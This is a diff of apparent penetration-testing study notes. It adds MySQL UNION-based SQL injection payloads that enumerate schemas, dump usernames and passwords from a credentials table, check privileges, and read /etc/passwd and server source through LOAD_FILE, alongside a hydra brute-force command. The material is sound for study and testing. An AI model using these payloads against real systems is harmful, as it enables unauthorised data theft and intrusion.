@@ -787,11 +787,144 @@ If we use the union clause it is important that we ensure that the data type on 
 It can appear that we query two columns from a table and want to union it with another single column. In that case, we have to add another column and fill it with junk. For example `NULL`, because it fits all data types.
 
 ```sql
-SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+SELECT * from products where product_id = '1' UNION SELECT username, NULL from passwords
 ```
 
+#### Union Injection
+
+To check the amount of columns we can use the `ORDER BY` or `UNION` function. If we exceed the number of columns we generate an error and therefore know the maximum number.
+
+```sql
+anything' UNION select 1,2,3-- 
+```
+```test
+Dont forget the whitespace after the double dash!
+```
+
+As a part of our `UNION` injection we can try to determine more information about the database.
+
+| Information       | Payload |
+| -----------    | ----------- |
+| Comments      | `SELECT @@version` |
+| Current User      | `SELECT user();`, `SELECT system_user();` |
+| List Users      | `SELECT user FROM mysql.user; — priv` |
+| List Password Hashes      | `SELECT host, user, password FROM mysql.user; — priv` |
+
+#### Enumeration
+
+To get data with a `UNION SELECT` we need to create proper `SELECT` queries. Therefor it is essential for us to know the schema conditions. This can be realized by enumeration.
+
+In our first step, we want to know what databases are present on the system. A matching injection could look like the following:
+
+```sql
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
+```
+
+Now that we have an overview of the databases, let's see which one we are in.
+
+```sql
+cn' UNION select 1,database(),2,3-- 
+```
+
+An overview over the different tables could look like the following:
+
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
+```
+
+The last information that we need are the name of the columns.
+
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+```
+
+Now that we have all the information, we can start querying data.
+
+```sql
+cn' UNION select 1, username, password, 4 from dev.credentials-- 
+```
+
+#### Reading Files
+
+There are two ways (`UNION SELECT` or `SELECT`) to check which rights our user has.
+
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- 
+```
+
+```sql
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
+```
+
+##### User Privileges
+
+Now that we know our user, we need to know which privileges he has.
+
+```sql
+SELECT super_priv FROM mysql.user
+```
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
+```
+
+When we have several users we can only show the privileges of the searched user.
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="larry"-- 
+```
+
+To check other privileges then the root user privilege we can use one of the following command.
+
+```sql
+SELECT sql_grants FROM information_schema.sql_show_grants
+```
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+```
+
+##### LOAD_FILE
+
+If the OS user has enough privileges we can use the `LOAD_FILE()` function to read files from the system.
+
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
+```
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
+```
+
+To see the Code press `[Ctrl + U]`.
+
+#### Writing Files
+
+Requirements:
+  1. User with `FILE` privilege enabled
+  2. MySQL global `secure_file_priv` variable not enabled
+  3. Write access to the location we want to write to on the back-end server
 
 ### MySQL
+
+To ensure that we are working with a `MySQL` Server we can use the following commands.
+
+| Payload       | When to Use | Expected Output | Wrong Output |
+| -----------    | ----------- | ----------- | ----------- |
+| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
+| `SELECT POW(1,1)` | When we only have numeric output | `1` | 	Error with other DBMS |
+| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |
+
 First we need a client, which is in our case `default-mysql-client`:
 ```bash 
 $ mysql -h [IP] -P [port] -u [username] -p
@@ -807,6 +940,8 @@ $ mysql -h [IP] -P [port] -u [username] -p
 2. `USE <database>;`
 3. `SHOW TABLES;`
 4. `SELECT * FROM <tablename>;`
+
+#### Cracking Credentials
 
 If we do not have any credentials we can use `Nmap` or `Metasplot` to gain this information:
 ```bash
@@ -829,6 +964,8 @@ hydra -t 16 -l root -P /usr/share/wordlists/rockyou.txt -vV 10.10.6.199 mysql
   [IP]      = The IP address of the target machine
   [mysql]   = Sets the protocol)
 ```
+#### Cheat Sheets
+- [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 ### John the Ripper
 If we have a hash which look something like the following example:
 ```
